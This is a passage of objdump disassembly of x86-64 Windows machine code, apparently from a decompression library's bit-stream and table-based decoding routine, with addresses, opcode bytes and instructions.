   140001686:	48 03 f0             	add    %rax,%rsi
   140001689:	48 2b d8             	sub    %rax,%rbx
   14000168c:	41 8b c9             	mov    %r9d,%ecx
   14000168f:	b8 01 00 00 00       	mov    $0x1,%eax
   140001694:	d3 e0                	shl    %cl,%eax
   140001696:	ff c0                	inc    %eax
   140001698:	41 8d 52 01          	lea    0x1(%r10),%edx
   14000169c:	4c 63 c0             	movslq %eax,%r8
   14000169f:	b8 01 00 00 00       	mov    $0x1,%eax
   1400016a4:	48 d3 e0             	shl    %cl,%rax
   1400016a7:	48 8d 0c 55 0b 00 00 	lea    0xb(,%rdx,2),%rcx
   1400016ae:	00 
   1400016af:	48 03 c8             	add    %rax,%rcx
   1400016b2:	ba 64 01 00 00       	mov    $0x164,%edx
   1400016b7:	48 c1 e9 02          	shr    $0x2,%rcx
   1400016bb:	49 03 c8             	add    %r8,%rcx
   1400016be:	48 c1 e1 02          	shl    $0x2,%rcx
   1400016c2:	48 3b ca             	cmp    %rdx,%rcx
   1400016c5:	77 ae                	ja     0x140001675
   1400016c7:	4a 8d 04 85 00 00 00 	lea    0x0(,%r8,4),%rax
   1400016ce:	00 
   1400016cf:	48 8b cf             	mov    %rdi,%rcx
   1400016d2:	48 2b d0             	sub    %rax,%rdx
   1400016d5:	45 8b c2             	mov    %r10d,%r8d
   1400016d8:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   1400016dd:	48 03 c7             	add    %rdi,%rax
   1400016e0:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   1400016e7:	00 
   1400016e8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400016ed:	e8 8e fc ff ff       	call   0x140001380
   1400016f2:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400016f6:	0f 87 c4 03 00 00    	ja     0x140001ac0
   1400016fc:	66 83 7f 02 00       	cmpw   $0x0,0x2(%rdi)
   140001701:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001706:	4c 89 a4 24 d8 02 00 	mov    %r12,0x2d8(%rsp)
   14000170d:	00 
   14000170e:	4c 8b c3             	mov    %rbx,%r8
   140001711:	4c 89 ac 24 a0 02 00 	mov    %r13,0x2a0(%rsp)
   140001718:	00 
   140001719:	48 8b d6             	mov    %rsi,%rdx
   14000171c:	4c 89 b4 24 98 02 00 	mov    %r14,0x298(%rsp)
   140001723:	00 
   140001724:	4c 89 bc 24 90 02 00 	mov    %r15,0x290(%rsp)
   14000172b:	00 
   14000172c:	0f 84 d2 03 00 00    	je     0x140001b04
   140001732:	4c 8b dd             	mov    %rbp,%r11
   140001735:	e8 f6 f9 ff ff       	call   0x140001130
   14000173a:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   14000173e:	0f 87 5c 03 00 00    	ja     0x140001aa0
   140001744:	44 0f b7 07          	movzwl (%rdi),%r8d
   140001748:	48 8d 05 21 c0 02 00 	lea    0x2c021(%rip),%rax        # 0x14002d770
   14000174f:	8b 54 24 58          	mov    0x58(%rsp),%edx
   140001753:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140001758:	41 03 d0             	add    %r8d,%edx
   14000175b:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140001760:	8b ca                	mov    %edx,%ecx
   140001762:	46 8b 0c 80          	mov    (%rax,%r8,4),%r9d
   140001766:	f7 d9                	neg    %ecx
   140001768:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   14000176d:	4d 8b e6             	mov    %r14,%r12
   140001770:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140001775:	49 d3 ec             	shr    %cl,%r12
   140001778:	8b ca                	mov    %edx,%ecx
   14000177a:	4d 23 e1             	and    %r9,%r12
   14000177d:	83 fa 40             	cmp    $0x40,%edx
   140001780:	77 3e                	ja     0x1400017c0
   140001782:	49 3b f5             	cmp    %r13,%rsi
   140001785:	72 0e                	jb     0x140001795
   140001787:	8b c2                	mov    %edx,%eax
   140001789:	48 c1 e8 03          	shr    $0x3,%rax
   14000178d:	48 2b f0             	sub    %rax,%rsi
   140001790:	83 e1 07             	and    $0x7,%ecx
   140001793:	eb 28                	jmp    0x1400017bd
   140001795:	49 3b f7             	cmp    %r15,%rsi
   140001798:	74 26                	je     0x1400017c0
   14000179a:	c1 e9 03             	shr    $0x3,%ecx
   14000179d:	48 8b c6             	mov    %rsi,%rax
   1400017a0:	48 2b c1             	sub    %rcx,%rax
   1400017a3:	49 3b c7             	cmp    %r15,%rax
   1400017a6:	73 05                	jae    0x1400017ad
   1400017a8:	8b ce                	mov    %esi,%ecx
   1400017aa:	41 2b cf             	sub    %r15d,%ecx
   1400017ad:	8b c1                	mov    %ecx,%eax
   1400017af:	48 2b f0             	sub    %rax,%rsi
   1400017b2:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   1400017b9:	8b ca                	mov    %edx,%ecx
   1400017bb:	2b c8                	sub    %eax,%ecx
   1400017bd:	4c 8b 36             	mov    (%rsi),%r14
   1400017c0:	42 8d 2c 01          	lea    (%rcx,%r8,1),%ebp
   1400017c4:	4d 8b d6             	mov    %r14,%r10
   1400017c7:	8b cd                	mov    %ebp,%ecx
   1400017c9:	f7 d9                	neg    %ecx
   1400017cb:	49 d3 ea             	shr    %cl,%r10
   1400017ce:	4d 23 d1             	and    %r9,%r10
   1400017d1:	83 fd 40             	cmp    $0x40,%ebp
   1400017d4:	77 43                	ja     0x140001819
   1400017d6:	49 3b f5             	cmp    %r13,%rsi
   1400017d9:	72 0e                	jb     0x1400017e9
   1400017db:	8b c5                	mov    %ebp,%eax
   1400017dd:	48 c1 e8 03          	shr    $0x3,%rax
   1400017e1:	48 2b f0             	sub    %rax,%rsi
   1400017e4:	83 e5 07             	and    $0x7,%ebp
   1400017e7:	eb 28                	jmp    0x140001811
   1400017e9:	49 3b f7             	cmp    %r15,%rsi
   1400017ec:	74 26                	je     0x140001814
   1400017ee:	8b cd                	mov    %ebp,%ecx
   1400017f0:	48 8b c6             	mov    %rsi,%rax
   1400017f3:	c1 e9 03             	shr    $0x3,%ecx
   1400017f6:	48 2b c1             	sub    %rcx,%rax
   1400017f9:	49 3b c7             	cmp    %r15,%rax
   1400017fc:	73 05                	jae    0x140001803
   1400017fe:	8b ce                	mov    %esi,%ecx
   140001800:	41 2b cf             	sub    %r15d,%ecx
   140001803:	8b c1                	mov    %ecx,%eax
   140001805:	48 2b f0             	sub    %rax,%rsi
   140001808:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   14000180f:	2b e8                	sub    %eax,%ebp
   140001811:	4c 8b 36             	mov    (%rsi),%r14
   140001814:	83 fd 40             	cmp    $0x40,%ebp
   140001817:	76 07                	jbe    0x140001820
   140001819:	ba 03 00 00 00       	mov    $0x3,%edx
   14000181e:	eb 4d                	jmp    0x14000186d
   140001820:	49 3b f5             	cmp    %r13,%rsi
   140001823:	72 10                	jb     0x140001835
   140001825:	8b c5                	mov    %ebp,%eax
   140001827:	83 e5 07             	and    $0x7,%ebp
   14000182a:	48 c1 e8 03          	shr    $0x3,%rax
   14000182e:	48 2b f0             	sub    %rax,%rsi
   140001831:	33 d2                	xor    %edx,%edx
   140001833:	eb 35                	jmp    0x14000186a
   140001835:	49 3b f7             	cmp    %r15,%rsi
   140001838:	75 0a                	jne    0x140001844
   14000183a:	83 fd 40             	cmp    $0x40,%ebp
   14000183d:	1b d2                	sbb    %edx,%edx
   14000183f:	83 c2 02             	add    $0x2,%edx
   140001842:	eb 29                	jmp    0x14000186d
   140001844:	8b cd                	mov    %ebp,%ecx
   140001846:	48 8b c6             	mov    %rsi,%rax
   140001849:	c1 e9 03             	shr    $0x3,%ecx
   14000184c:	33 d2                	xor    %edx,%edx
   14000184e:	48 2b c1             	sub    %rcx,%rax
   140001851:	49 3b c7             	cmp    %r15,%rax
   140001854:	73 0a                	jae    0x140001860
   140001856:	8b ce                	mov    %esi,%ecx
   140001858:	ba 01 00 00 00       	mov    $0x1,%edx
   14000185d:	41 2b cf             	sub    %r15d,%ecx
   140001860:	8b c1                	mov    %ecx,%eax
   140001862:	48 2b f0             	sub    %rax,%rsi
   140001865:	6b c1 f8             	imul   $0xfffffff8,%ecx,%eax
   140001868:	03 e8                	add    %eax,%ebp
   14000186a:	4c 8b 36             	mov    (%rsi),%r14
   14000186d:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140001872:	33 c9                	xor    %ecx,%ecx
   140001874:	49 8d 80 fc 00 00 00 	lea    0xfc(%r8),%rax
   14000187b:	4c 3b d8             	cmp    %rax,%r11
   14000187e:	0f 92 c1             	setb   %cl
   140001881:	33 c0                	xor    %eax,%eax
   140001883:	85 d2                	test   %edx,%edx
   140001885:	0f 94 c0             	sete   %al
   140001888:	85 c8                	test   %ecx,%eax
   14000188a:	0f 84 e1 00 00 00    	je     0x140001971
   140001890:	46 8b 4c a7 04       	mov    0x4(%rdi,%r12,4),%r9d
   140001895:	49 8b d6             	mov    %r14,%rdx
   140001898:	41 8b c1             	mov    %r9d,%eax
   14000189b:	45 8b c1             	mov    %r9d,%r8d
   14000189e:	c1 e8 10             	shr    $0x10,%eax
   1400018a1:	4d 8b e6             	mov    %r14,%r12
   1400018a4:	41 88 03             	mov    %al,(%r11)
   1400018a7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400018ac:	41 c1 e8 18          	shr    $0x18,%r8d
   1400018b0:	46 8b 54 90 04       	mov    0x4(%rax,%r10,4),%r10d
   1400018b5:	41 8d 3c 28          	lea    (%r8,%rbp,1),%edi
   1400018b9:	41 8b c2             	mov    %r10d,%eax
   1400018bc:	c1 e8 10             	shr    $0x10,%eax
   1400018bf:	41 f7 d8             	neg    %r8d
   1400018c2:	41 88 43 01          	mov    %al,0x1(%r11)
   1400018c6:	41 83 e0 3f          	and    $0x3f,%r8d
   1400018ca:	83 e5 3f             	and    $0x3f,%ebp
   1400018cd:	41 0f b7 c1          	movzwl %r9w,%eax
   1400018d1:	40 0f b6 cd          	movzbl %bpl,%ecx
   1400018d5:	41 8b da             	mov    %r10d,%ebx
   1400018d8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400018dd:	48 d3 e2             	shl    %cl,%rdx
   1400018e0:	41 0f b6 c8          	movzbl %r8b,%ecx
   1400018e4:	48 d3 ea             	shr    %cl,%rdx
   1400018e7:	48 03 d0             	add    %rax,%rdx
   1400018ea:	c1 eb 18             	shr    $0x18,%ebx
   1400018ed:	44 8b 44 95 04       	mov    0x4(%rbp,%rdx,4),%r8d
   1400018f2:	8d 0c 1f             	lea    (%rdi,%rbx,1),%ecx
   1400018f5:	49 d3 e4             	shl    %cl,%r12
   1400018f8:	45 8b c8             	mov    %r8d,%r9d
   1400018fb:	41 0f b7 c0          	movzwl %r8w,%eax
   1400018ff:	49 8b d6             	mov    %r14,%rdx
   140001902:	41 c1 e8 10          	shr    $0x10,%r8d
   140001906:	41 c1 e9 18          	shr    $0x18,%r9d
   14000190a:	45 88 43 02          	mov    %r8b,0x2(%r11)
   14000190e:	41 8b c9             	mov    %r9d,%ecx
   140001911:	f7 d9                	neg    %ecx
   140001913:	49 d3 ec             	shr    %cl,%r12
   140001916:	8b cf                	mov    %edi,%ecx
   140001918:	48 d3 e2             	shl    %cl,%rdx
   14000191b:	4c 03 e0             	add    %rax,%r12
   14000191e:	41 0f b7 c2          	movzwl %r10w,%eax
   140001922:	8b cb                	mov    %ebx,%ecx
   140001924:	f7 d9                	neg    %ecx
   140001926:	4d 8b d6             	mov    %r14,%r10
   140001929:	48 d3 ea             	shr    %cl,%rdx
   14000192c:	48 03 d0             	add    %rax,%rdx
   14000192f:	41 8d 04 19          	lea    (%r9,%rbx,1),%eax
   140001933:	8d 0c 38             	lea    (%rax,%rdi,1),%ecx
   140001936:	49 d3 e2             	shl    %cl,%r10
   140001939:	44 8b 44 95 04       	mov    0x4(%rbp,%rdx,4),%r8d
   14000193e:	8d 2c 38             	lea    (%rax,%rdi,1),%ebp
   140001941:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140001946:	41 8b d0             	mov    %r8d,%edx
   140001949:	c1 ea 18             	shr    $0x18,%edx
   14000194c:	03 ea                	add    %edx,%ebp
   14000194e:	41 0f b7 c0          	movzwl %r8w,%eax
   140001952:	f7 da                	neg    %edx
   140001954:	41 c1 e8 10          	shr    $0x10,%r8d
   140001958:	83 e2 3f             	and    $0x3f,%edx
   14000195b:	45 88 43 03          	mov    %r8b,0x3(%r11)
   14000195f:	0f b6 ca             	movzbl %dl,%ecx
   140001962:	49 d3 ea             	shr    %cl,%r10
   140001965:	4c 03 d0             	add    %rax,%r10
   140001968:	49 83 c3 04          	add    $0x4,%r11
   14000196c:	e9 a3 fe ff ff       	jmp    0x140001814
   140001971:	49 8d 98 fd 00 00 00 	lea    0xfd(%r8),%rbx
   140001978:	4c 3b db             	cmp    %rbx,%r11
   14000197b:	0f 87 18 01 00 00    	ja     0x140001a99
   140001981:	46 8b 44 a7 04       	mov    0x4(%rdi,%r12,4),%r8d
   140001986:	8b cd                	mov    %ebp,%ecx
   140001988:	41 8b d0             	mov    %r8d,%edx
   14000198b:	45 0f b7 e0          	movzwl %r8w,%r12d
   14000198f:	c1 ea 18             	shr    $0x18,%edx
   140001992:	49 8b c6             	mov    %r14,%rax
   140001995:	48 d3 e0             	shl    %cl,%rax
   140001998:	8b ca                	mov    %edx,%ecx
   14000199a:	f7 d9                	neg    %ecx
   14000199c:	41 c1 e8 10          	shr    $0x10,%r8d
   1400019a0:	48 d3 e8             	shr    %cl,%rax
   1400019a3:	45 88 03             	mov    %r8b,(%r11)
   1400019a6:	44 8d 0c 2a          	lea    (%rdx,%rbp,1),%r9d
   1400019aa:	4c 03 e0             	add    %rax,%r12
   1400019ad:	49 ff c3             	inc    %r11
   1400019b0:	41 83 f9 40          	cmp    $0x40,%r9d
   1400019b4:	0f 87 36 01 00 00    	ja     0x140001af0
   1400019ba:	49 3b f5             	cmp    %r13,%rsi
   1400019bd:	72 10                	jb     0x1400019cf
   1400019bf:	41 8b c1             	mov    %r9d,%eax
   1400019c2:	48 c1 e8 03          	shr    $0x3,%rax
   1400019c6:	48 2b f0             	sub    %rax,%rsi
   1400019c9:	41 83 e1 07          	and    $0x7,%r9d
   1400019cd:	eb 34                	jmp    0x140001a03
   1400019cf:	49 3b f7             	cmp    %r15,%rsi
   1400019d2:	74 32                	je     0x140001a06
   1400019d4:	41 8b c9             	mov    %r9d,%ecx
   1400019d7:	48 8b c6             	mov    %rsi,%rax
   1400019da:	c1 e9 03             	shr    $0x3,%ecx
   1400019dd:	48 2b c1             	sub    %rcx,%rax
   1400019e0:	49 3b c7             	cmp    %r15,%rax
   1400019e3:	73 11                	jae    0x1400019f6
   1400019e5:	8b c6                	mov    %esi,%eax
   1400019e7:	41 2b c7             	sub    %r15d,%eax
   1400019ea:	48 2b f0             	sub    %rax,%rsi
   1400019ed:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   1400019f4:	eb 0a                	jmp    0x140001a00
   1400019f6:	48 2b f1             	sub    %rcx,%rsi
   1400019f9:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001a00:	44 2b c8             	sub    %eax,%r9d
   140001a03:	4c 8b 36             	mov    (%rsi),%r14
   140001a06:	4c 3b db             	cmp    %rbx,%r11
   140001a09:	0f 87 8a 00 00 00    	ja     0x140001a99
   140001a0f:	46 8b 44 97 04       	mov    0x4(%rdi,%r10,4),%r8d
   140001a14:	41 8b c9             	mov    %r9d,%ecx
   140001a17:	41 8b d0             	mov    %r8d,%edx
   140001a1a:	45 0f b7 d0          	movzwl %r8w,%r10d
   140001a1e:	c1 ea 18             	shr    $0x18,%edx
   140001a21:	49 8b c6             	mov    %r14,%rax
   140001a24:	48 d3 e0             	shl    %cl,%rax
   140001a27:	8b ca                	mov    %edx,%ecx
   140001a29:	f7 d9                	neg    %ecx
   140001a2b:	41 c1 e8 10          	shr    $0x10,%r8d
   140001a2f:	48 d3 e8             	shr    %cl,%rax
   140001a32:	45 88 03             	mov    %r8b,(%r11)
   140001a35:	42 8d 2c 0a          	lea    (%rdx,%r9,1),%ebp
   140001a39:	4c 03 d0             	add    %rax,%r10
   140001a3c:	49 ff c3             	inc    %r11
   140001a3f:	83 fd 40             	cmp    $0x40,%ebp
   140001a42:	0f 87 94 00 00 00    	ja     0x140001adc
   140001a48:	49 3b f5             	cmp    %r13,%rsi
   140001a4b:	72 0e                	jb     0x140001a5b
   140001a4d:	8b c5                	mov    %ebp,%eax
   140001a4f:	48 c1 e8 03          	shr    $0x3,%rax
   140001a53:	48 2b f0             	sub    %rax,%rsi
   140001a56:	83 e5 07             	and    $0x7,%ebp
   140001a59:	eb 32                	jmp    0x140001a8d
   140001a5b:	49 3b f7             	cmp    %r15,%rsi
   140001a5e:	74 30                	je     0x140001a90
   140001a60:	8b cd                	mov    %ebp,%ecx
   140001a62:	48 8b c6             	mov    %rsi,%rax
   140001a65:	c1 e9 03             	shr    $0x3,%ecx
   140001a68:	48 2b c1             	sub    %rcx,%rax
   140001a6b:	49 3b c7             	cmp    %r15,%rax
   140001a6e:	73 11                	jae    0x140001a81
   140001a70:	8b c6                	mov    %esi,%eax
   140001a72:	41 2b c7             	sub    %r15d,%eax
   140001a75:	48 2b f0             	sub    %rax,%rsi
   140001a78:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   140001a7f:	eb 0a                	jmp    0x140001a8b
   140001a81:	48 2b f1             	sub    %rcx,%rsi
   140001a84:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001a8b:	2b e8                	sub    %eax,%ebp
   140001a8d:	4c 8b 36             	mov    (%rsi),%r14
   140001a90:	4c 3b db             	cmp    %rbx,%r11
   140001a93:	0f 86 e8 fe ff ff    	jbe    0x140001981
   140001a99:	48 c7 c0 ba ff ff ff 	mov    $0xffffffffffffffba,%rax
   140001aa0:	4c 8b b4 24 98 02 00 	mov    0x298(%rsp),%r14
   140001aa7:	00 
   140001aa8:	4c 8b ac 24 a0 02 00 	mov    0x2a0(%rsp),%r13
   140001aaf:	00 
   140001ab0:	4c 8b a4 24 d8 02 00 	mov    0x2d8(%rsp),%r12
   140001ab7:	00 
   140001ab8:	4c 8b bc 24 90 02 00 	mov    0x290(%rsp),%r15
   140001abf:	00 
   140001ac0:	48 8b 8c 24 80 02 00 	mov    0x280(%rsp),%rcx
   140001ac7:	00 
   140001ac8:	48 33 cc             	xor    %rsp,%rcx
   140001acb:	e8 f0 aa 00 00       	call   0x14000c5c0
   140001ad0:	48 81 c4 a8 02 00 00 	add    $0x2a8,%rsp
   140001ad7:	5f                   	pop    %rdi
   140001ad8:	5e                   	pop    %rsi
   140001ad9:	5d                   	pop    %rbp
   140001ada:	5b                   	pop    %rbx
   140001adb:	c3                   	ret
   140001adc:	42 0f b6 44 a7 06    	movzbl 0x6(%rdi,%r12,4),%eax
   140001ae2:	41 88 03             	mov    %al,(%r11)
   140001ae5:	4c 2b 5c 24 40       	sub    0x40(%rsp),%r11
   140001aea:	49 8d 43 01          	lea    0x1(%r11),%rax
   140001aee:	eb b0                	jmp    0x140001aa0
   140001af0:	42 0f b6 44 97 06    	movzbl 0x6(%rdi,%r10,4),%eax
   140001af6:	41 88 03             	mov    %al,(%r11)
   140001af9:	4c 2b 5c 24 40       	sub    0x40(%rsp),%r11
   140001afe:	49 8d 43 01          	lea    0x1(%r11),%rax
   140001b02:	eb 9c                	jmp    0x140001aa0
   140001b04:	4c 8b f5             	mov    %rbp,%r14
   140001b07:	e8 24 f6 ff ff       	call   0x140001130
   140001b0c:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140001b10:	77 8e                	ja     0x140001aa0
   140001b12:	44 0f b7 07          	movzwl (%rdi),%r8d
   140001b16:	48 8d 05 53 bc 02 00 	lea    0x2bc53(%rip),%rax        # 0x14002d770
   140001b1d:	8b 54 24 58          	mov    0x58(%rsp),%edx
   140001b21:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140001b26:	41 03 d0             	add    %r8d,%edx
   140001b29:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140001b2e:	8b ca                	mov    %edx,%ecx
   140001b30:	46 8b 0c 80          	mov    (%rax,%r8,4),%r9d
   140001b34:	f7 d9                	neg    %ecx
   140001b36:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   140001b3b:	4c 8b fe             	mov    %rsi,%r15
   140001b3e:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001b43:	49 d3 ef             	shr    %cl,%r15
   140001b46:	8b ca                	mov    %edx,%ecx
   140001b48:	4d 23 f9             	and    %r9,%r15
   140001b4b:	83 fa 40             	cmp    $0x40,%edx
   140001b4e:	77 3d                	ja     0x140001b8d
   140001b50:	49 3b fc             	cmp    %r12,%rdi
   140001b53:	72 0e                	jb     0x140001b63
   140001b55:	8b c2                	mov    %edx,%eax
   140001b57:	48 c1 e8 03          	shr    $0x3,%rax
   140001b5b:	48 2b f8             	sub    %rax,%rdi
   140001b5e:	83 e1 07             	and    $0x7,%ecx
   140001b61:	eb 27                	jmp    0x140001b8a
   140001b63:	48 3b fd             	cmp    %rbp,%rdi
   140001b66:	74 25                	je     0x140001b8d
   140001b68:	c1 e9 03             	shr    $0x3,%ecx
   140001b6b:	48 8b c7             	mov    %rdi,%rax
   140001b6e:	48 2b c1             	sub    %rcx,%rax
   140001b71:	48 3b c5             	cmp    %rbp,%rax
   140001b74:	73 04                	jae    0x140001b7a
   140001b76:	8b cf                	mov    %edi,%ecx
   140001b78:	2b cd                	sub    %ebp,%ecx
   140001b7a:	8b c1                	mov    %ecx,%eax
   140001b7c:	48 2b f8             	sub    %rax,%rdi
   140001b7f:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001b86:	8b ca                	mov    %edx,%ecx
   140001b88:	2b c8                	sub    %eax,%ecx
   140001b8a:	48 8b 37             	mov    (%rdi),%rsi
   140001b8d:	4c 8b 6c 24 38       	mov    0x38(%rsp),%r13
   140001b92:	46 8d 14 01          	lea    (%rcx,%r8,1),%r10d
   140001b96:	41 8b ca             	mov    %r10d,%ecx
   140001b99:	4c 8b de             	mov    %rsi,%r11
   140001b9c:	f7 d9                	neg    %ecx
   140001b9e:	49 d3 eb             	shr    %cl,%r11
   140001ba1:	4d 23 d9             	and    %r9,%r11
   140001ba4:	41 83 fa 40          	cmp    $0x40,%r10d
   140001ba8:	77 4c                	ja     0x140001bf6
   140001baa:	49 3b fc             	cmp    %r12,%rdi
   140001bad:	72 10                	jb     0x140001bbf
   140001baf:	41 8b c2             	mov    %r10d,%eax
   140001bb2:	48 c1 e8 03          	shr    $0x3,%rax
   140001bb6:	48 2b f8             	sub    %rax,%rdi
   140001bb9:	41 83 e2 07          	and    $0x7,%r10d
   140001bbd:	eb 29                	jmp    0x140001be8
   140001bbf:	48 3b fd             	cmp    %rbp,%rdi
   140001bc2:	74 2c                	je     0x140001bf0
   140001bc4:	41 8b ca             	mov    %r10d,%ecx
   140001bc7:	48 8b c7             	mov    %rdi,%rax
   140001bca:	c1 e9 03             	shr    $0x3,%ecx
   140001bcd:	48 2b c1             	sub    %rcx,%rax
   140001bd0:	48 3b c5             	cmp    %rbp,%rax
   140001bd3:	73 04                	jae    0x140001bd9
   140001bd5:	8b cf                	mov    %edi,%ecx
   140001bd7:	2b cd                	sub    %ebp,%ecx
   140001bd9:	8b c1                	mov    %ecx,%eax
   140001bdb:	48 2b f8             	sub    %rax,%rdi
   140001bde:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001be5:	44 2b d0             	sub    %eax,%r10d
   140001be8:	48 8b 37             	mov    (%rdi),%rsi
   140001beb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001bf0:	41 83 fa 40          	cmp    $0x40,%r10d
   140001bf4:	76 07                	jbe    0x140001bfd
   140001bf6:	ba 03 00 00 00       	mov    $0x3,%edx
   140001bfb:	eb 51                	jmp    0x140001c4e
   140001bfd:	49 3b fc             	cmp    %r12,%rdi
   140001c00:	72 12                	jb     0x140001c14
   140001c02:	41 8b c2             	mov    %r10d,%eax
   140001c05:	41 83 e2 07          	and    $0x7,%r10d
   140001c09:	48 c1 e8 03          	shr    $0x3,%rax
   140001c0d:	48 2b f8             	sub    %rax,%rdi
   140001c10:	33 d2                	xor    %edx,%edx
   140001c12:	eb 37                	jmp    0x140001c4b
   140001c14:	48 3b fd             	cmp    %rbp,%rdi
   140001c17:	75 0b                	jne    0x140001c24
   140001c19:	41 83 fa 40          	cmp    $0x40,%r10d
   140001c1d:	1b d2                	sbb    %edx,%edx
   140001c1f:	83 c2 02             	add    $0x2,%edx
   140001c22:	eb 2a                	jmp    0x140001c4e
   140001c24:	41 8b ca             	mov    %r10d,%ecx
   140001c27:	48 8b c7             	mov    %rdi,%rax
   140001c2a:	c1 e9 03             	shr    $0x3,%ecx
   140001c2d:	33 d2                	xor    %edx,%edx
   140001c2f:	48 2b c1             	sub    %rcx,%rax
   140001c32:	48 3b c5             	cmp    %rbp,%rax
   140001c35:	73 09                	jae    0x140001c40
   140001c37:	8b cf                	mov    %edi,%ecx
   140001c39:	ba 01 00 00 00       	mov    $0x1,%edx
   140001c3e:	2b cd                	sub    %ebp,%ecx
   140001c40:	8b c1                	mov    %ecx,%eax
   140001c42:	48 2b f8             	sub    %rax,%rdi
   140001c45:	6b c1 f8             	imul   $0xfffffff8,%ecx,%eax
   140001c48:	44 03 d0             	add    %eax,%r10d
   140001c4b:	48 8b 37             	mov    (%rdi),%rsi
   140001c4e:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140001c53:	33 c9                	xor    %ecx,%ecx
   140001c55:	49 8d 80 fc 00 00 00 	lea    0xfc(%r8),%rax
   140001c5c:	4c 3b f0             	cmp    %rax,%r14
   140001c5f:	0f 92 c1             	setb   %cl
   140001c62:	33 c0                	xor    %eax,%eax
   140001c64:	85 d2                	test   %edx,%edx
   140001c66:	0f 94 c0             	sete   %al
   140001c69:	85 c8                	test   %ecx,%eax
   140001c6b:	0f 84 f0 00 00 00    	je     0x140001d61
   140001c71:	47 8b 4c bd 04       	mov    0x4(%r13,%r15,4),%r9d
   140001c76:	48 8b d6             	mov    %rsi,%rdx
   140001c79:	41 8b c1             	mov    %r9d,%eax
   140001c7c:	4c 8b fe             	mov    %rsi,%r15
   140001c7f:	c1 e8 18             	shr    $0x18,%eax
   140001c82:	44 8b c0             	mov    %eax,%r8d
   140001c85:	41 8d 0c 02          	lea    (%r10,%rax,1),%ecx
   140001c89:	41 8b c1             	mov    %r9d,%eax
   140001c8c:	c1 e8 10             	shr    $0x10,%eax
   140001c8f:	41 88 06             	mov    %al,(%r14)
   140001c92:	43 8b 5c 9d 04       	mov    0x4(%r13,%r11,4),%ebx
   140001c97:	8b c3                	mov    %ebx,%eax
   140001c99:	c1 e8 18             	shr    $0x18,%eax
   140001c9c:	44 8b d8             	mov    %eax,%r11d
   140001c9f:	44 8d 14 01          	lea    (%rcx,%rax,1),%r10d
   140001ca3:	f7 d9                	neg    %ecx
   140001ca5:	48 d3 ea             	shr    %cl,%rdx
   140001ca8:	8b c3                	mov    %ebx,%eax
   140001caa:	c1 e8 10             	shr    $0x10,%eax
   140001cad:	41 88 46 01          	mov    %al,0x1(%r14)
   140001cb1:	48 8d 05 b8 ba 02 00 	lea    0x2bab8(%rip),%rax        # 0x14002d770
   140001cb8:	42 8b 04 80          	mov    (%rax,%r8,4),%eax
   140001cbc:	48 23 d0             	and    %rax,%rdx
   140001cbf:	41 0f b7 c1          	movzwl %r9w,%eax
   140001cc3:	48 03 d0             	add    %rax,%rdx
   140001cc6:	45 8b 44 95 04       	mov    0x4(%r13,%rdx,4),%r8d
   140001ccb:	41 8b c0             	mov    %r8d,%eax
   140001cce:	c1 e8 18             	shr    $0x18,%eax
   140001cd1:	8b d0                	mov    %eax,%edx
   140001cd3:	45 8d 0c 02          	lea    (%r10,%rax,1),%r9d
   140001cd7:	41 f7 da             	neg    %r10d
   140001cda:	41 83 e2 3f          	and    $0x3f,%r10d
   140001cde:	48 8d 05 8b ba 02 00 	lea    0x2ba8b(%rip),%rax        # 0x14002d770
   140001ce5:	8b 04 90             	mov    (%rax,%rdx,4),%eax
   140001ce8:	41 8b c9             	mov    %r9d,%ecx
   140001ceb:	f7 d9                	neg    %ecx
   140001ced:	48 8b d6             	mov    %rsi,%rdx
   140001cf0:	49 d3 ef             	shr    %cl,%r15
   140001cf3:	41 0f b6 ca          	movzbl %r10b,%ecx
   140001cf7:	4c 23 f8             	and    %rax,%r15
   140001cfa:	48 d3 ea             	shr    %cl,%rdx
   140001cfd:	41 0f b7 c0          	movzwl %r8w,%eax
   140001d01:	4c 03 f8             	add    %rax,%r15
   140001d04:	41 c1 e8 10          	shr    $0x10,%r8d
   140001d08:	45 88 46 02          	mov    %r8b,0x2(%r14)
   140001d0c:	48 8d 05 5d ba 02 00 	lea    0x2ba5d(%rip),%rax        # 0x14002d770
   140001d13:	42 8b 04 98          	mov    (%rax,%r11,4),%eax
   140001d17:	4c 8b de             	mov    %rsi,%r11
   140001d1a:	48 23 d0             	and    %rax,%rdx
   140001d1d:	0f b7 c3             	movzwl %bx,%eax
   140001d20:	48 03 d0             	add    %rax,%rdx
   140001d23:	45 8b 44 95 04       	mov    0x4(%r13,%rdx,4),%r8d
   140001d28:	41 8b c0             	mov    %r8d,%eax
   140001d2b:	c1 e8 18             	shr    $0x18,%eax
   140001d2e:	8b d0                	mov    %eax,%edx
   140001d30:	46 8d 14 08          	lea    (%rax,%r9,1),%r10d
